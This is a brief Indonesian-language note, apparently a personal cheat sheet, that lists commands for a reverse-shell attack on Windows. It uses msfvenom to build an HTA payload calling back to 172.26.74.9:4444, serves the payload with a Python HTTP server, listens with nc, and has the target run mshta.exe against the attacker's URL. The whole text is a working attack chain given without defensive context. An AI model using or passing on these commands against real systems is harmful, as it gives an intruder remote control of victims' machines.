# command untuk menghasilkan baka.hta
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.26.74.9 LPORT=4444 -f hta-psh -o baka.hta
```
setelah itu di host attacker jalankan:
```
python3 -m http.server
```

dan untuk listening
```
nc -lnvp 4444
```

kemudian pada target jalankan
```
mshta.exe http://172.26.74.9:8000/baka.hta

```